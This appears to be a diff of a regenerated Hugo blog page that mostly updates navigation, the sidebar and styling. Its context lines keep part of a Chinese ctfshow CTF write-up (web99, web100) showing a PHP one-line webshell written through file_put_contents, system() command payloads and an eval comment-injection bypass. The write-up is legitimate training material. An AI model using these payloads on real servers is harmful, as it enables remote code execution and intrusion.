@@ -42,7 +42,7 @@
   <meta name="author" content="Frederick">
 
   
-  <meta name="generator" content="Hugo 0.154.5">
+  <meta name="generator" content="Hugo 0.158.0">
 
   
   
@@ -70,11 +70,13 @@
   <select onchange="location = this.value;">
     <option value="">Navigate…</option>
       
-        <option value="https://Frederick2313072.github.io/about/">» About</option>
-      
-        <option value="https://Frederick2313072.github.io/links/">» Links</option>
+        <option value="https://Frederick2313072.github.io/">» Home</option>
       
         <option value="https://Frederick2313072.github.io/archives/">» Archives</option>
+      
+        <option value="https://Frederick2313072.github.io/talks/">» Talks</option>
+      
+        <option value="https://Frederick2313072.github.io/about/">» About</option>
       
   </select>
 </fieldset>
@@ -84,15 +86,19 @@
   
   
     
-      <li><a href="https://Frederick2313072.github.io/about/" title="About"  target="_blank"  rel="noopener noreferrer">About</a></li>
-    
-  
-    
-      <li><a href="https://Frederick2313072.github.io/links/" title="Links"  target="_blank"  rel="noopener noreferrer">Links</a></li>
+      <li><a href="https://Frederick2313072.github.io/" title="Home">Home</a></li>
     
   
     
       <li><a href="https://Frederick2313072.github.io/archives/" title="Archives"  target="_blank"  rel="noopener noreferrer">Archives</a></li>
+    
+  
+    
+      <li><a href="https://Frederick2313072.github.io/talks/" title="Talks"  target="_blank"  rel="noopener noreferrer">Talks</a></li>
+    
+  
+    
+      <li><a href="https://Frederick2313072.github.io/about/" title="About"  target="_blank"  rel="noopener noreferrer">About</a></li>
     
   
 </ul>
@@ -208,12 +214,12 @@
 </code></pre><p>我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag,get直接url？，post用hackbar</p>
 <p>web99</p>
 <p>file_put_contents()写入文件</p>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5<span style="color:#719e07">.</span>php(此处数字随意，只要在rand(<span style="color:#2aa198">1</span>,<span style="color:#2aa198">0x36d</span>)之间即可),转换之后也就是5,明显是在题目中生成的数组中的,满足条件，同时进入下一步后，我们就可将一句话木马写入了5<span style="color:#719e07">.</span>php中
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5<span style="color:#719e07">.</span>php(此处数字随意，只要在rand(<span style="color:#2aa198">1</span>,<span style="color:#2aa198">0x36d</span>)之间即可),转换之后也就是5,明显是在题目中生成的数组中的,满足条件，同时进入下一步后，我们就可将一句话木马写入了5<span style="color:#719e07">.</span>php中
 </span></span></code></pre></div><p>get:?n=5.php post:content=<?php @eval=$_POST=['hack'];?></p>
 <p>查看post:content=<?php system('ls');?> ,查看flag：content=<?php system('tac flag36d.php');?></p>
 <p>web100</p>
 <p>三个参数 v1 ，v2 ，v3，其中v0 实际上只会去判断v1是否为数字 ，因此v1 = 1234 数字即可</p>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#719e07">if</span>(<span style="color:#268bd2">$v0</span>){
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#719e07">if</span>(<span style="color:#268bd2">$v0</span>){
 </span></span><span style="display:flex;"><span>    <span style="color:#719e07">if</span>(<span style="color:#719e07">!</span>preg_match(<span style="color:#2aa198">&#34;/\;/&#34;</span>, <span style="color:#268bd2">$v2</span>)){ <span style="color:#586e75"># 表示v2中不能有符号 ；
 </span></span></span><span style="display:flex;"><span>        <span style="color:#719e07">if</span>(preg_match(<span style="color:#2aa198">&#34;/\;/&#34;</span>, <span style="color:#268bd2">$v3</span>)){ <span style="color:#586e75">#表示v3 中必须要有 ;
 </span></span></span><span style="display:flex;"><span>            <span style="color:#719e07">eval</span>(<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">$v2</span><span style="color:#2aa198">(&#39;ctfshow&#39;)</span><span style="color:#2aa198">$v3</span><span style="color:#2aa198">&#34;</span>); <span style="color:#586e75"># 这里是eval中 拼接v2 v3 
@@ -224,7 +230,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#586e75">v3=*/</span>;
 </span></span></code></pre></div><p>拼接起来就是var_dump($ctfshow)/ <em>(&lsquo;ctfshow&rsquo;)</em> / ; 可以执行</p>
 <p>v2 也可以用其他显示输出的函数</p>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>v2<span style="color:#719e07">=</span>print_r(<span style="color:#268bd2">$ctfshow</span>)<span style="color:#586e75">/*&amp;v3=*/</span>;
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>v2<span style="color:#719e07">=</span>print_r(<span style="color:#268bd2">$ctfshow</span>)<span style="color:#586e75">/*&amp;v3=*/</span>;
 </span></span></code></pre></div><p>注意拼接之后要把v3注释掉，flag要把02xd换成-</p>
 
         </div>
@@ -284,68 +290,64 @@
     
 
 <aside class="sidebar thirds">
-  <section class="first odd">
 
-    
-      <h1>About me</h1>
-    
+  
+  
+  
 
-    <p>
+  
+  <section class="odd">
+    <h1>Archives</h1>
+    <ul id="sidebar-archives">
       
-        <p>2023南开DS在读</p>
-<p>目前在TJUNLP</p>
-<p>感兴趣的方向：NLP,OS,LLM,Security</p>
-<p>最喜欢的编程语言：Rust<br>
-Click on 
-<a href="../../about/">About</a> to know more.</p>
-
       
-    </p>
+        <li>
+          <a href="../../archives/#january-2026">January 2026</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#december-2025">December 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#september-2025">September 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#august-2025">August 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#june-2025">June 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#may-2025">May 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#april-2025">April 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#march-2025">March 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#february-2025">February 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#january-2025">January 2025</a>
+        </li>
+      
+        <li>
+          <a href="../../archives/#december-2024">December 2024</a>
+        </li>
+      
+    </ul>
   </section>
 
-  
-  
-
-
-
-<ul class="sidebar-nav">
-  <li class="sidebar-nav-item">
-    <a target="_blank" rel="noopener noreferrer" href="https://github.com/Frederick2313072" title="https://github.com/Frederick2313072"><i class="fa fa-github fa-3x"></i></a>
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-
-  
-  
-  </li>
-</ul>
-
-  
-
-  
-    
-      <section class="odd">
-        
-          <h1>Collections</h1>
-        
-        
-          <li>
-            <a href="https://Frederick2313072.github.io/categories/golang/" title="Hugo category" >Hugo category</a>
-          </li>
-        
-      </section>
-    
-  
-
-  
   
   
     
@@ -384,6 +386,7 @@ Click on
       </section>
     
   
+
 </aside>
 
   </div>
